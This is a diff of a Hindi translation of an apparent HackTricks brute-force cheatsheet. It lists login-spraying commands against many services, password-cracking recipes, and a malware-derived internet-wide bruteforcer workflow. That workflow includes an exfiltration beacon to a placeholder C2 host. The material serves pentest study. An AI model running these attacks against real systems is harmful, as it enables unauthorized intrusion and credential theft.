@@ -1,8 +1,10 @@
-# Brute Force - CheatSheet
+# Brute Force - चीटशीट
 
-## Default Credentials
+{{#include ../banners/hacktricks-training.md}}
 
-उपयोग की जा रही technology के default credentials के लिए **Google पर search करें**, या **इन links को आज़माएँ**:
+## डिफ़ॉल्ट क्रेडेंशियल्स
+
+उपयोग की जा रही technology के डिफ़ॉल्ट क्रेडेंशियल्स के लिए **google पर खोजें**, या **इन links को आज़माएँ**:
 
 - [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
 - [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
@@ -19,7 +21,7 @@
 
 ## **अपने Dictionaries बनाएँ**
 
-Target के बारे में अधिक-से-अधिक information प्राप्त करें और एक custom dictionary generate करें। ये tools मदद कर सकते हैं:
+Target के बारे में अधिक-से-अधिक जानकारी एकत्र करें और एक custom dictionary generate करें। ये Tools मदद कर सकते हैं:
 
 ### Crunch
 ```bash
@@ -32,7 +34,7 @@ crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using chars
 ^ Special characters including spac
 crunch 6 8 -t ,@@^^%%
 ```
-### वेबसाइट आधारित wordlists
+### वेबसाइट-आधारित wordlists
 ```bash
 # Cewl gets words from the victims page
 cewl example.com -m 5 -w words.txt
@@ -45,13 +47,13 @@ cat /path/to/js-urls.txt | python3 getjswords.py
 ```
 ### [CUPP](https://github.com/Mebus/cupp)
 
-पीड़ित के बारे में अपनी जानकारी (नाम, तारीखें...) के आधार पर passwords generate करें.
+पीड़ित के बारे में अपनी जानकारी (नाम, तारीखें...) के आधार पर passwords generate करें।
 ```
 python3 cupp.py -h
 ```
 ### [Wister](https://github.com/cycurity/wister)
 
-एक wordlist generator tool, जो आपको शब्दों का एक सेट देने की सुविधा देता है। यह दिए गए शब्दों से कई variations तैयार करता है, जिससे किसी specific target के लिए उपयोग करने योग्य unique और ideal wordlist बनाई जा सकती है।
+एक wordlist generator tool, जो आपको शब्दों का एक set देने की सुविधा देता है और दिए गए शब्दों से कई variations तैयार करने की संभावना प्रदान करता है, जिससे किसी specific target के संबंध में उपयोग करने के लिए एक unique और ideal wordlist बनाई जा सकती है।
 ```bash
 python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst
 
@@ -85,19 +87,19 @@ Finished in 0.920s.
 - [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
 - [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)
 
-## Internet-wide bruteforcer workflow (Go-based scanners से सीखे गए पाठ)
+## Internet-wide bruteforcer workflow (Go-based scanners से प्राप्त lessons)
 
-GoBruteforcer malware के scanning workflow में निम्नलिखित व्यवहार देखे गए; सटीक मान sample-specific हैं।<sup>[[1]](#references)</sup>
+GoBruteforcer malware के scanning workflow में निम्नलिखित behaviors देखे गए; exact values sample-specific हैं।<sup>[[1]](#references)</sup>
 
-- **architecture-tuned worker pools** बनाए रखें (उदाहरण के लिए, `x86_64/arm64` पर 95 concurrent workers, `i686` पर 85, `armv5tel` पर 35 और अन्य architectures पर डिफ़ॉल्ट रूप से 50), active workers की हर सेकंड जांच करें और target से कम होने पर replacements spawn करें; प्रत्येक worker exit होने से पहले अधिकतम एक target IP संभालता है।
-- **random public IPv4s** generate करें, लेकिन स्पष्ट रूप से unroutable और operator द्वारा टाले गए चुने हुए ranges को हटा दें: RFC1918, `100.64.0.0/10`, `127.0.0.0/8`, `0.0.0.0/8`, `169.254.0.0/16`, `198.18.0.0/15`, multicast `>=224.0.0.0/4`, cloud-heavy `/8`s (`3/15/16/56`) और DoD-associated `/8`s (`6/7/11/21/22/26/28/29/30/33/55/214/215`)।
-- **service port को probe करें** और short timeout (~2s) रखें, फिर **cleartext logins** (FTP/21, MySQL/3306, Postgres/5432, HTTP/80 पर phpMyAdmin) आज़माएं और C2 credential fetch विफल होने पर **small builtin credential list** पर fallback करें।
-- **hits को exfiltrate करें** tiny HTTP GET beacons जैसे `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>` के माध्यम से (service codes जैसे `1=PMA`, `2=MySQL`, `3=FTP`, `4=Postgres`), और blend in करने के लिए common browser User-Agent का पुनः उपयोग करें।
-- **phpMyAdmin spray** लगभग 80 संभावित paths पर brute-force कर सकता है और `GET /index.php?lang=en` का उपयोग कर सकता है, PMA markers (`pmahomme` theme/`phpmyadmin.css`/`navigation.php`) detect कर सकता है तथा auth branching के लिए `codemirror.css?v=X.Y.Z` parse कर सकता है: `<4.9` versions GET params `pma_username`/`pma_password` स्वीकार करते हैं; `>=4.9` versions `server=1`, CSRF `token` और समान creds के साथ POST का उपयोग करते हैं।
+- **architecture-tuned worker pools** बनाए रखें (उदाहरण के लिए, `x86_64/arm64` पर 95 concurrent workers, `i686` पर 85, `armv5tel` पर 35 और अन्य architectures पर default रूप से 50), active workers को हर second check करें और target से कम होने पर replacements spawn करें; प्रत्येक worker exit होने से पहले अधिकतम एक target IP handle करे।
+- **random public IPv4s** generate करें, लेकिन स्पष्ट रूप से unroutable और operators द्वारा avoid की जाने वाली selected ranges को हटाएँ: RFC1918, `100.64.0.0/10`, `127.0.0.0/8`, `0.0.0.0/8`, `169.254.0.0/16`, `198.18.0.0/15`, multicast `>=224.0.0.0/4`, cloud-heavy `/8`s (`3/15/16/56`) और DoD-associated `/8`s (`6/7/11/21/22/26/28/29/30/33/55/214/215`)।
+- **cleartext logins** का प्रयास करने से पहले **service port को probe** करें और short timeout (~2s) रखें (FTP/21, MySQL/3306, Postgres/5432, HTTP/80 पर phpMyAdmin); C2 credential fetch fail होने पर **small builtin credential list** पर fallback करें।
+- Hits को `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>` जैसे छोटे HTTP GET beacons के माध्यम से **exfiltrate** करें (service codes जैसे `1=PMA`, `2=MySQL`, `3=FTP`, `4=Postgres`), और blend in करने के लिए common browser User-Agent reuse करें।
+- **phpMyAdmin spray** लगभग 80 संभावित paths को brute-force कर सकता है, `GET /index.php?lang=en` के साथ, PMA markers (`pmahomme` theme/`phpmyadmin.css`/`navigation.php`) detect कर सकता है और `codemirror.css?v=X.Y.Z` को parse करके auth branch कर सकता है: versions `<4.9` GET params `pma_username`/`pma_password` स्वीकार करते हैं; versions `>=4.9` `server=1`, CSRF `token` और उन्हीं creds के साथ POST का उपयोग करते हैं।
 
 ## Services
 
-service name के अनुसार alphabetical order में।
+Service name के अनुसार alphabetical order में।
 
 ### AFP
 ```bash
@@ -113,7 +115,7 @@ msf> run
 ```bash
 nmap --script ajp-brute -p 8009 <IP>
 ```
-### AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM and Solace)
+### AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM और Solace)
 ```bash
 legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
 ```
@@ -149,7 +151,7 @@ ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
 medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
 legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
 ```
-### HTTP सामान्य Brute
+### HTTP Generic Brute
 
 #### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)
 
@@ -170,7 +172,7 @@ legba http.ntlm2 --domain example.org --workstation client --username admin --pa
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
 # Use https-post-form mode for https
 ```
-For http**s** के लिए आपको "http-post-form" से "**https-post-form" में बदलना होगा**
+http**s** के लिए आपको "http-post-form" को "**https-post-form"** में बदलना होगा
 
 ### **HTTP - CMS --** (W)ordpress, (J)oomla या (D)rupal या (M)oodle
 ```bash
@@ -289,7 +291,7 @@ nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>
 
 legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
 ```
-**patator** के साथ **oracle_login** का उपयोग करने के लिए आपको इन्हें **install** करना होगा:
+**patator** के साथ **oracle_login** का उपयोग करने के लिए आपको **install** करना होगा:
 ```bash
 pip3 install cx_Oracle --upgrade
 ```
@@ -417,11 +419,11 @@ legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --targ
 ```
 #### कमजोर SSH keys / Debian predictable PRNG
 
-कुछ systems में cryptographic material generate करने के लिए उपयोग किए जाने वाले random seed में ज्ञात flaws होते हैं। इसके परिणामस्वरूप keyspace बहुत कम हो सकता है, जिसे [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute) जैसे tools से bruteforce किया जा सकता है। कमजोर keys के पहले से generate किए गए sets भी उपलब्ध हैं, जैसे [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)।
+कुछ systems में cryptographic material generate करने के लिए उपयोग किए जाने वाले random seed में ज्ञात flaws होते हैं। इसके परिणामस्वरूप keyspace बहुत कम हो सकता है, जिसे [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute) जैसे tools से bruteforce किया जा सकता है। कमजोर keys के pre-generated sets भी उपलब्ध हैं, जैसे [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)।
 
 ### STOMP (ActiveMQ, RabbitMQ, HornetQ and OpenMQ)
 
-STOMP text protocol एक व्यापक रूप से उपयोग किया जाने वाला messaging protocol है, जो RabbitMQ, ActiveMQ, HornetQ और OpenMQ जैसी लोकप्रिय message queueing services के साथ **निर्बाध communication और interaction की अनुमति देता है**। यह messages का आदान-प्रदान करने और विभिन्न messaging operations को पूरा करने के लिए standardized और efficient approach प्रदान करता है।
+STOMP text protocol एक व्यापक रूप से उपयोग किया जाने वाला messaging protocol है, जो RabbitMQ, ActiveMQ, HornetQ और OpenMQ जैसी लोकप्रिय message queueing services के साथ **सहज communication और interaction की अनुमति देता है**। यह messages का exchange करने और विभिन्न messaging operations को perform करने के लिए एक standardized और efficient approach प्रदान करता है।
 ```bash
 legba stomp --target localhost:61613 --username admin --password data/passwords.txt
 ```
@@ -459,13 +461,13 @@ set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
 ```bash
 crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 ```
-## Local
+## स्थानीय
 
-### Online cracking databases
+### ऑनलाइन cracking databases
 
 - [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 और SHA1)
 - [https://shuck.sh/get-shucking.php](https://shuck.sh/get-shucking.php) (MSCHAPv2/PPTP-VPN/NetNTLMv1 with/without ESS/SSP और किसी भी challenge's value के साथ)
-- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, WPA2 captures और MSOffice, ZIP, PDF... archives)
+- [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, WPA2 captures, और MSOffice, ZIP, PDF archives...)
 - [https://crackstation.net/](https://crackstation.net) (Hashes)
 - [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
 - [https://gpuhash.me/](https://gpuhash.me) (Hashes और file hashes)
@@ -475,7 +477,7 @@ crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
 - [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
 - [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)
 
-Hash पर brute force करने से पहले इसे देखें।
+Hash को brute force करने से पहले इसे जांच लें।
 
 ### ZIP
 ```bash
@@ -495,7 +497,7 @@ hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
 ```
 #### Known plaintext zip attack
 
-आपको encrypted zip के **अंदर मौजूद file** के **plaintext** (या plaintext के किसी हिस्से) की जानकारी होना आवश्यक है। आप **encrypted zip** के अंदर मौजूद **files के filenames और size** को चलाकर देख सकते हैं: **`7z l encrypted.zip`**\
+आपको encrypted zip के अंदर मौजूद **file के** **plaintext** (या plaintext के किसी हिस्से) की जानकारी होनी चाहिए। आप **encrypted zip के अंदर मौजूद files के filenames और size** इस command से check कर सकते हैं: **`7z l encrypted.zip`**\
 [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) को releases page से download करें।
 ```bash
 # You need to create a zip file containing only the file that is inside the encrypted zip
@@ -530,7 +532,7 @@ qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
 ```
 ### PDF Owner Password
 
-PDF Owner password crack करने के लिए इसे देखें: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
+PDF Owner password को crack करने के लिए इसे देखें: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)
 
 ### JWT
 ```bash
@@ -564,9 +566,9 @@ john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
 hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 ./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
 ```
-### Lucks इमेज
+### Lucks image
 
-#### विधि 1
+#### Method 1
 
 इंस्टॉल करें: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
 ```bash
@@ -575,7 +577,7 @@ cryptsetup luksOpen backup.img mylucksopen
 ls /dev/mapper/ #You should find here the image mylucksopen
 mount /dev/mapper/mylucksopen /mnt
 ```
-#### विधि 2
+#### Method 2
 ```bash
 cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
 dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
@@ -603,14 +605,14 @@ john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
 
 ### DPAPI Master Key
 
-[https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) का उपयोग करें और फिर john चलाएं
+[https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) का उपयोग करें और फिर john चलाएँ
 
-### Open Office Pwd Protected Column
+### Open Office पासवर्ड से सुरक्षित Column
 
-यदि आपके पास password से protected column वाली xlsx file है, तो आप उसे unprotect कर सकते हैं:
+यदि आपके पास password से protected column वाली xlsx file है, तो आप उसका protection हटा सकते हैं:
 
-- **इसे Google Drive पर upload करें** और password अपने-आप remove हो जाएगा
-- इसे **manually remove करने के लिए**:
+- **इसे Google Drive पर upload करें** और password अपने-आप हटा दिया जाएगा
+- इसे **manually हटाने के लिए**:
 ```bash
 unzip file.xlsx
 grep -R "sheetProtection" ./*
@@ -635,7 +637,7 @@ crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
 hash-identifier
 > <HASH>
 ```
-### Wordlists
+### शब्द-सूचियां
 
 - **Rockyou**
 - [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
@@ -644,13 +646,13 @@ hash-identifier
 
 ### **Wordlist Generation Tools**
 
-- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** कॉन्फ़िगर करने योग्य base chars, keymap और routes के साथ उन्नत keyboard-walk generator।
+- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** कॉन्फ़िगर किए जा सकने वाले base chars, keymap और routes वाला उन्नत keyboard-walk generator।
 ```bash
 kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
 ```
 ### John mutation
 
-_**/etc/john/john.conf**_ पढ़ें और इसे configure करें
+_**/etc/john/john.conf**_ पढ़ें और इसे configure करें.
 ```bash
 john --wordlist=words.txt --rules --stdout > w_mutated.txt
 john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
@@ -661,14 +663,14 @@ john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
 
 - **Wordlist attack** (`-a 0`) rules के साथ
 
-**Hashcat** में पहले से ही **rules वाला folder** शामिल होता है, लेकिन आप [**अन्य उपयोगी rules यहाँ देख सकते हैं**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules)।
+**Hashcat** में पहले से ही **rules वाला एक folder** आता है, लेकिन आप [**यहाँ अन्य उपयोगी rules पा सकते हैं**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules)।
 ```
 hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
 ```
 - **Wordlist combinator** attack
 
-hashcat के साथ **2 wordlists को 1 में combine करना** संभव है।\
-यदि list 1 में **"hello"** शब्द है और दूसरी list में **"world"** और **"earth"** शब्दों वाली 2 lines हैं, तो `helloworld` और `helloearth` शब्द generate किए जाएंगे।
+hashcat के साथ **2 wordlists को 1 में combine** करना संभव है।\
+यदि list 1 में **"hello"** शब्द और दूसरी list में **"world"** और **"earth"** शब्दों वाली 2 lines हों, तो `helloworld` और `helloearth` शब्द generate किए जाएंगे।
 ```bash
 # This will combine 2 wordlists
 hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt
@@ -719,11 +721,11 @@ hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d
 # Mask numbers will be prepended to each word in the wordlist
 hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
 ```
-#### Hashcat modes
+#### Hashcat के modes
 ```bash
 hashcat --example-hashes | grep -B1 -A2 "NTLM"
 ```
-Linux Hashes Cracking - /etc/shadow फ़ाइल
+Linux Hashes को Crack करना - /etc/shadow file
 ```
 500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
 3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
@@ -735,7 +737,7 @@ Windows Hashes को Crack करना
 3000 | LM                                               | Operating-Systems
 1000 | NTLM                                             | Operating-Systems
 ```
-सामान्य एप्लिकेशन Hashes को Cracking करना
+सामान्य Application Hashes को Crack करना
 ```
 900 | MD4                                              | Raw Hash
 0 | MD5                                              | Raw Hash
@@ -747,5 +749,5 @@ Windows Hashes को Crack करना
 ```
 ## References
 
-- [1] [GoBruteforcer के अंदर: AI द्वारा generated server defaults, कमजोर passwords और crypto-केंद्रित campaigns](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
+- [1] [GoBruteforcer के अंदर: AI-जनित server defaults, कमजोर passwords और crypto-केंद्रित campaigns](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
 {{#include ../banners/hacktricks-training.md}}
